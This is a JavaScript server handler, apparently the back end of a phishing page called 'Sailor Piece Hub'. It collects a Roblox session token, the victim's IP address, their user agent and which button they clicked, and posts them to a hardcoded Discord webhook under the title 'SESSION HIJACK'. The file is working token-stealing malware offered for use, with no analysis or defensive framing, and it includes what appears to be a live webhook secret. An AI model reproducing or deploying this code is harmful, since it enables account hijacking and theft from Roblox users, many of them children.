export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Non autorisé');

    const webhook = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";
    const { rblx, choice, ua } = req.body;
    const ip = req.headers['x-forwarded-for'] || "IP Inconnue";

    const embed = {
        embeds: [{
            title: "⚡ HACK INCONNU - SESSION HIJACK",
            color: 0x00d4ff,
            fields: [
                { name: "🌐 ADRESSE IP", value: `\`${ip}\``, inline: true },
                { name: "🖱️ ACTION CIBLE", value: `Bouton ${choice} cliqué`, inline: true },
                { name: "🔑 ROBLOX TOKEN", value: "```" + rblx + "```" },
                { name: "📱 USER AGENT", value: `\`${ua}\`` }
            ],
            footer: { text: "Raven System v4.0 - Sailor Piece Hub" },
            timestamp: new Date()
        }]
    };

    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embed)
    });

    res.status(200).json({ status: "success" });
}
